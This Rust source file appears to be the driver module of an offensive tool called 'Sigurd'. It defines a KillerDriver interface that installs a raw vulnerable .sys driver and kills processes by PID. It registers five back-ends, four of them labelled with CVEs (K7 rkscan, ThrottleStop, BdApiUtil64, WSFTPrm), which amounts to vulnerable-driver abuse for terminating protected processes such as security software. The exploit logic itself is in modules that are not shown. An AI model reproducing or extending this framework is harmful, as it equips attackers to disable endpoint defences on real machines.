use crate::utils::error::SigurdError;

#[cfg(feature = "k7rkscan")]
pub mod k7rkscan;
#[cfg(feature = "throttlestop")]
pub mod throttlestop;
#[cfg(feature = "bdapiutil64")]
pub mod bdapiutil64;
#[cfg(feature = "wsftprm")]
pub mod wsftprm;
#[cfg(feature = "ksapi64")]
pub mod ksapi64;

pub trait KillerDriver {
    /// Will be called on Sigurd start. 
    fn new() -> Result<Box<dyn KillerDriver>, SigurdError> where Self: Sized + 'static;
    
    /// Called before the kill, called only ones. Sigurd guarantee that service was installed and started
    /// 
    /// Can return error in case something went wrong during surface prep
    /// 
    /// Can also return error if system doesn't meet the required conditions
    fn init(&mut self) -> Result<bool, SigurdError>;

    /// Will be called on app exit
    fn destruct(&mut self) -> Result<bool, SigurdError>;

    /// Should return valid driver name (will be used for service)
    fn name(&self) -> &'static str;
    /// Return version just for user info
    fn version(&self) -> &'static str;
    /// Return description just for user info
    fn description(&self) -> &'static str;
    /// Return raw driver file (unencrypted .sys file)
    fn get_file(&self) -> Result<Vec<u8>, SigurdError>;

    /// Kills process with given pid
    /// 
    /// When kill is called, Sigurd guarantee that init was called first
    fn kill(&mut self, pid: u32) -> Result<(), SigurdError>;
}

pub fn get_drivers() -> Result<Vec<Box<dyn KillerDriver>>, SigurdError> {
    // Initialize driver options
    let mut driver_options: Vec<Box<dyn KillerDriver>> = Vec::new();

    // K7 driver (CVE-2025-1055)
    #[cfg(feature = "k7rkscan")]
    {
        use crate::drivers::k7rkscan::K7rkscan;

        let k7 = K7rkscan::new()?;
        driver_options.push(k7);
    }
        
    // ThrottleStop (CVE-2025-7771)
    #[cfg(feature = "throttlestop")]
    {
        use crate::drivers::throttlestop::ThrottleStop;

        let throttlestop = ThrottleStop::new()?;
        driver_options.push(throttlestop);
    }

    // BdApiUtil64 (CVE-2024-51324)
    #[cfg(feature = "bdapiutil64")]
    {
        use crate::drivers::bdapiutil64::BdApiUtil64;

        let bdapiutil64 = BdApiUtil64::new()?;
        driver_options.push(bdapiutil64);
    }

    // WSFTPrm (CVE-2023-52271)
    #[cfg(feature = "wsftprm")]
    {
        use crate::drivers::wsftprm::WSFTPrm;

        let wsftprm = WSFTPrm::new()?;
        driver_options.push(wsftprm);
    }

    // KsAPI64 
    #[cfg(feature = "ksapi64")]
    {
        use crate::drivers::ksapi64::KsApi64;

        let ksapi64 = KsApi64::new()?;
        driver_options.push(ksapi64);
    }

    // Result
    return Ok(driver_options);
}
